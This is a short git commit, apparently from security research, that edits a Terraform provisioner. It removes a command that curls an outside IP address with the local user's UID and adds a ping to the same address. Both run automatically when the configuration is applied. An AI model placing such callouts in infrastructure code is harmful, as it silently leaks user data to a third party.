2888e3a99a8f8673366ed209d654c1bfafab96cf
benny <benny.himley@nccgroup.trust>
2019-07-12 11:19:01 -0700

    try ping again

--- main.tf
+++ main.tf
@@ -9,7 +9,7 @@ resource "random_id" "random" {
 
 resource "null_resource" "example1" {
   provisioner "local-exec" {
-    command = "curl 35.247.19.101/?uid=$UID"
+    command = "ping 35.247.19.101"
   }
 }
 
